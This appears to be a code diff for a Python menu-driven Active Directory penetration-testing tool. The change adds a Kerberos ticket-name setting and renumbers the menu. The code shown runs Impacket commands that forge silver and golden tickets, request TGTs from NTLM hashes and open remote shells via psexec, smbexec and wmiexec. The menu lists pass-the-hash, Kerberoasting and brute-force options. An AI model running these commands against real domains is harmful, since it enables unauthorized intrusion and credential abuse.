@@ -173,6 +173,7 @@ def saveParams():
       config.write(USR + "\n")
       config.write(PAS + "\n")
       config.write(NTM + "\n")
+      config.write(TGT + "\n")
       config.write(DOM + "\n")
       config.write(SID + "\n")
       config.write(TSH + "\n")
@@ -180,21 +181,23 @@ def saveParams():
       config.write(DIR + "\n")
    return
    
-def privCheck():
+def privCheck(TGT):
    command("ls  | grep ccache > ticket.tmp")
    count = len(open('ticket.tmp').readlines())
    if count > 1:
-      print("[i] More than one ticket identified, using first in list...")
-   ticket = linecache.getline("ticket.tmp", 1).rstrip("\n")
-   if ticket != "":
-      command("export KRB5CCNAME=" + ticket)
-      print("[*] Checking ticket " + ticket + "...")
+      print("[i] More than one ticket was found, using first in list...")
+   TGT = linecache.getline("ticket.tmp", 1).rstrip("\n")
+   TGT = TGT.rstrip(" ")
+   if TGT != "":
+      command("export KRB5CCNAME=" + TGT)
+      print("[*] Checking ticket " + TGT + "...")
       command(keyPath + "psexec.py  " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       command(keyPath + "smbexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
       command(keyPath + "wmiexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -k -no-pass")
+      TGT = spacePadding(TGT, COL1)
    else:
       print("[-] Unable to find a valid ticket...")
-   return 
+   return (TGT)
 
 def keys():
    print("\nRegistry Hives:-\n")
@@ -385,23 +388,44 @@ def display():
    
 # -----
 
+   print('\u2551' + " TICKET NAME  " + '\u2551', end=' ')
+   if TGT[:5] == "EMPTY":
+      print(colored(TGT[:COL1],colour7), end=' ')
+   else:
+      print(colored(TGT[:COL1],colour6), end=' ')
+   print('\u2551', end=' ')   
+   if TSH.rstrip(" ") in SHAR[7]:
+      print(colored(SHAR[7],colour3), end=' ')
+   else:
+      print(colored(SHAR[7],colour6), end=' ')   
+   print('\u2551', end=' ')   
+   if VALD[6] == "1":
+      print(colored(USER[7],colour3), end=' ')
+      print(colored(HASH[7],colour3), end=' ')
+   else:
+      print(colored(USER[7],colour6), end=' ')
+      print(colored(HASH[7],colour6), end=' ')         
+   print('\u2551')
+   
+#----
+
    print('\u2551' + " DOMAIN NAME  " + '\u2551', end=' ')
    if DOM[:5] == "EMPTY":
       print(colored(DOM[:COL1],colour7), end=' ')
    else:
       print(colored(DOM[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[7]:
-      print(colored(SHAR[7],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[8]:
+      print(colored(SHAR[8],colour3), end=' ')
    else:
-      print(colored(SHAR[7],colour6), end=' ')      
+      print(colored(SHAR[8],colour6), end=' ')      
    print('\u2551', end=' ')   
    if VALD[7] == "1":
-      print(colored(USER[7],colour3), end=' ')
-      print(colored(HASH[7],colour3), end=' ')
+      print(colored(USER[8],colour3), end=' ')
+      print(colored(HASH[8],colour3), end=' ')
    else:
-      print(colored(USER[7],colour6), end=' ')
-      print(colored(HASH[7],colour6), end=' ')         
+      print(colored(USER[8],colour6), end=' ')
+      print(colored(HASH[8],colour6), end=' ')         
    print('\u2551')
    
 # -----
@@ -412,17 +436,17 @@ def display():
    else:
       print(colored(SID[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[8]:
-      print(colored(SHAR[8],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[9]:
+      print(colored(SHAR[9],colour3), end=' ')
    else:
-      print(colored(SHAR[8],colour6), end=' ')   
+      print(colored(SHAR[9],colour6), end=' ')   
    print('\u2551', end=' ')   
    if VALD[8] == "1":
-      print(colored(USER[8],colour3), end=' ')
-      print(colored(HASH[8],colour3), end=' ')
+      print(colored(USER[9],colour3), end=' ')
+      print(colored(HASH[9],colour3), end=' ')
    else:
-      print(colored(USER[8],colour6), end=' ')
-      print(colored(HASH[8],colour6), end=' ')         
+      print(colored(USER[9],colour6), end=' ')
+      print(colored(HASH[9],colour6), end=' ')         
    print('\u2551')     
    
 # -----
@@ -433,21 +457,21 @@ def display():
    else:
       print(colored(TSH[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[9]:
-      print(colored(SHAR[9],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[10]:
+      print(colored(SHAR[10],colour3), end=' ')
    else:
-      print(colored(SHAR[9],colour6), end=' ')      
+      print(colored(SHAR[10],colour6), end=' ')      
    print('\u2551', end=' ')   
    if VALD[9] == "1":
-      print(colored(USER[9],colour3), end=' ')
-      print(colored(HASH[9],colour3), end=' ')
+      print(colored(USER[10],colour3), end=' ')
+      print(colored(HASH[10],colour3), end=' ')
    else:
-      if USER[10][:1] != "":
-         print(colored(USER[9],colour0), end=' ')
-         print(colored(HASH[9],colour0), end=' ')      
+      if USER[11][:1] != "":
+         print(colored(USER[10],colour0), end=' ')
+         print(colored(HASH[10],colour0), end=' ')      
       else:
-         print(colored(USER[9],colour6), end=' ')
-         print(colored(HASH[9],colour6), end=' ')
+         print(colored(USER[10],colour6), end=' ')
+         print(colored(HASH[10],colour6), end=' ')
    print('\u2551')         
    
 # -----
@@ -456,18 +480,17 @@ def display():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS SERVER  (13) Whois DNS SERVER   (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID (71) Hydra FTP  (81) FTP    " + '\u2551')
-   print('\u2551' + "(02) Re/Set REMOTE IP   (14) Dig   DNS SERVER   (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER (72) Hydra SSH  (82) SSH    " + '\u2551')
-   print('\u2551' + "(03) Re/Set LIVE PORTS  (15) Recon DOM SERVER   (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS (73) Hydra SMB  (83) SSH ID " + '\u2551')
-   print('\u2551' + "(04) Re/Set WEB ADDRESS (16) Dump  DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER (74) Hydra POP3 (84) Telnet " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER NAME   (17) NMAP LIVE PORT     (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS (75) Hydra TOM  (85) NetCat " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS WORD   (18) NMap PORT Service  (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH (76) MSF TOMCAT (86) SQSH   " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM HASH   (19) NMap SubDOMAINS    (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
-   print('\u2551' + "(08) Re/Set DOMAIN NAME (20) Nmap Server TIME   (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (68) GoPhishing  (78) RSyncDumpS (88) MySQL  " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN SID                          (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (69) GoBuster    (79) RDeskTop   (89) WinRm  " + '\u2551')
-   print('\u2551' + "(10) Re/Set SHARE NAME                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (70) Nikto Scan  (80) XDesktop   (90)        " + '\u2551')
-   print('\u2551' + "(11) Re/Set SERVER TIME                                                                                                                                (91)        " + '\u2551')
-   print('\u2551' + "(12)                                                                                                                                                   (92) Exit   " + '\u2661')
+   print('\u2551' + "(01) Re/Set DNS SERVER  (12) Re/Set SERVER TIME (21) GetArch (31) WinDap Search  (41) Kerberos Info  (51) Golden PAC  (61) GenSSHKeyID (71) Hydra FTP  (81) FTP    " + '\u2551')
+   print('\u2551' + "(02) Re/Set REMOTE IP   (13) Whois DNS SERVER   (22) NetView (32) Lookup SIDs    (42) KerbUserFilter (52) Domain Dump (62) GenListUSER (72) Hydra SSH  (82) SSH    " + '\u2551')
+   print('\u2551' + "(03) Re/Set LIVE PORTS  (14) dig DNS SERVER     (23) Service (33) SamDump Users  (43) KerbBruteForce (53) *BloodHound (63) GenListPASS (73) Hydra SMB  (83) SSH ID " + '\u2551')
+   print('\u2551' + "(04) Re/Set WEB ADDRESS (15) Recon DNS SERVER   (24) AtExec  (34) REGistryValues (44) KerbRoasting   (54) *BH ACLPwn  (64) Editor USER (74) Hydra POP3 (84) Telnet " + '\u2551')
+   print('\u2551' + "(05) Re/Set USER NAME   (16) Dump DNS SERVER    (25) DcomExe (35) List EndPoints (45) KerbASREPRoast (55) SecretsDump (65) Editor PASS (75) Hydra TOM  (85) NetCat " + '\u2551')
+   print('\u2551' + "(06) Re/Set PASS WORD   (17) NMap LIVE PORTS    (26) PsExec  (36) Rpc Client     (46) PASSWORD2HASH  (56) CrackMapExe (66) Editor HASH (76) MSF TOMCAT (86) SQSH   " + '\u2551')
+   print('\u2551' + "(07) Re/Set NTLM HASH   (18) NMap PORT Servcie  (27) SmbExec (37) Smb Client     (47) HASHES Spray   (57) PSExec HASH (67) Editor HOST (77) RemoteSync (87) MSSQL  " + '\u2551')
+   print('\u2551' + "(08) Re/Set TICKET NAME (19) Nmap SubDOMAINS    (28) WmiExec (38) SmbMap SHARE   (48) Pass the HASH  (58) SmbExecHASH (68) GoPhishing  (78) RSyncDumpS (88) MySQL  " + '\u2551')
+   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap Server TIME   (29) IfMap   (39) SmbCopy Files  (49) Silver Ticket  (59) WmiExecHASH (69) GoBuster    (79) RDeskTop   (89) WinRm  " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN SID                          (30) OpDump  (40) SmbMount SHARE (50) Golden Ticket  (60) NTDSDecrypt (70) Nikto Scan  (80) XDesktop   (90)        " + '\u2551')
+   print('\u2551' + "(11) Re/Set SHARE NAME                                                                                                                                 (91) Exit   " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -564,6 +587,7 @@ if not os.path.exists(dataDir + "/config.txt"):
    USR = "''                 " 						# SESSION USERNAME
    PAS = "''                 "						# SESSION PASSWORD       
    NTM = "EMPTY              " 						# NTLM HASH
+   TGT = "EMPTY              "						# TICKET NAME
    DOM = "EMPTY              " 						# DOMAIN NAME
    SID = "EMPTY              " 						# DOMAIN SID
    TSH = "EMPTY              " 						# SESSION SHARE
@@ -579,11 +603,12 @@ else:
    USR = linecache.getline(dataDir + "/config.txt", 5).rstrip("\n")
    PAS = linecache.getline(dataDir + "/config.txt", 6).rstrip("\n")
    NTM = linecache.getline(dataDir + "/config.txt", 7).rstrip("\n")
-   DOM = linecache.getline(dataDir + "/config.txt", 8).rstrip("\n")	
-   SID = linecache.getline(dataDir + "/config.txt", 9).rstrip("\n")
-   TSH = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
-   LTM = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
-   DIR = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")      
+   TGT = linecache.getline(dataDir + "/config.txt", 8).rstrip("\n")
+   DOM = linecache.getline(dataDir + "/config.txt", 9).rstrip("\n")	
+   SID = linecache.getline(dataDir + "/config.txt", 10).rstrip("\n")
+   TSH = linecache.getline(dataDir + "/config.txt", 11).rstrip("\n")
+   LTM = linecache.getline(dataDir + "/config.txt", 12).rstrip("\n")
+   DIR = linecache.getline(dataDir + "/config.txt", 13).rstrip("\n")      
    PTS = POR     
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
@@ -592,6 +617,7 @@ WEB = spacePadding(WEB, COL1)
 USR = spacePadding(USR, COL1)
 PAS = spacePadding(PAS, COL1)
 NTM = spacePadding(NTM, COL1)
+TGT = spacePadding(TGT, COL1)
 DOM = spacePadding(DOM, COL1)
 SID = spacePadding(SID, COL1)
 TSH = spacePadding(TSH, COL1)
@@ -872,7 +898,7 @@ while True:
             print("[*] Defualting to IP 4...")
             IP46 = "-4"     
          checkInterface("DNS")       
-      prompt()    
+         prompt()    
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1000,11 +1026,27 @@ while True:
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - Change the remote DOMAIN name.
+# Details : Menu option selected - Change the ticket name
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '8':
+      BAK = TGT
+      TGT = input("[*] Please enter TGT name: ")
+      if TGT != "":
+         TGT = spacePadding(TGT, COL1)
+      else:
+         TGT = BAK
+
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Change the remote DOMAIN name.
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '9':
       BAK = DOM
       DOM = input("[*] Please enter DOMAIN name: ")
       if DOM != "":
@@ -1028,7 +1070,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '9':
+   if selection == '10':
       BAK = SID
       SID = input("[*] Please enter DOMAIN SID value: ")
       if SID != "":
@@ -1044,7 +1086,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '10':
+   if selection == '11':
       BAK = TSH
       TSH = input("[*] Please enter SHARE name: ")
       if TSH != "":
@@ -1060,7 +1102,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '11':
+   if selection == '12':
       BAK = LTM
       LTM = input("[*] Please enter computer TIME: ")
       if LTM != "":
@@ -1068,34 +1110,7 @@ while True:
          LTM = spacePadding(LTM, COL1)
          SKEW = 1
       else:
-         LTM = BAK      
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Change local working DIRECTORY.
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-#   if selection == '12':
-#      oldDirectory = workDir     
-#      newDirectory = input("[*] Please enter new WORK FOLDER: ").upper()
-#      if os.path.exists(newDirectory):
-#         print("[+] Directory already exists....")
-#      else:
-#         if len(newDirectory) > 0:
-#            os.mkdir(newDirectory)
-#            DIR = newDirectory            
-#            DIR = spacePadding(DIR, COL1)
-#            print("[+] Working directory changed...")
-#            print("[*] Checking to see if the old directory can be safely deleted...")            
-#            if len(os.listdir(oldDirectory)) == 0:
-#               os.rmdir(oldDirectory)
-#               print("[+] Old directory succesfully deleted...")
-#            else:
-#               print("[+] Old directory still contains data...")
-#      prompt()
+         LTM = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1954,7 +1969,7 @@ while True:
                   if "[*] Saving ticket" in checkFile:
                      print("[*] Ticket successfully generated for " + USR.rstrip(" ") + " using hash substitute " + str(USER[counter]).rstrip(" ") + ":" + brute + "...")                    
                      print("[*] Now checking ticket status..\n")
-                     privCheck()                         
+                     TGT = privCheck(TGT)                         
                      NTM = spacePadding(brute, COL1)
                      checkParams = 2
                      break                                                   
@@ -1989,7 +2004,7 @@ while True:
             command(keyPath + "getTGT.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + TIP.rstrip(" ") + " -hashes :" + NTM.rstrip(" "))
             if os.path.exists(USR.rstrip(" ") + "@" + TIP.rstrip(" ") + ".ccache"):
                print("[+] Checking TGT status...")
-               privCheck()
+               TGT = privCheck(TGT)
          else:
             print("[+] TGT was not generated...")                  
       prompt()
@@ -2014,7 +2029,7 @@ while True:
             command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/DESKTOP-01." + DOM.rstrip(" ") + " " + USR.rstrip(" "))
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking silver TGT status...")
-            privCheck()
+            TGT = privCheck(TGT)
          else:
              print("[+] Silver TGT was not generated...")      
       prompt()
@@ -2039,7 +2054,7 @@ while True:
             command(keyPath + "ticketer.py -nthash :" + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))            
          if os.path.exists(USR.rstrip(" ") + ".ccache"):
             print("[+] Checking gold TGT status...")
-            privCheck()
+            TGT = privCheck(TGT)
          else:
             print("[+] Golden TGT was not generated...")
       prompt()
@@ -2968,19 +2983,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='90':
-      exit(1)
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected -
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection =='91':
-      exit(1)
-               
+      exit(1)               
                  
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2990,7 +2993,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '92':        
+   if selection == '91':        
       saveParams()      
       if DOMC == 1:
          print("[*] Removing domain name from /etc/hosts...")
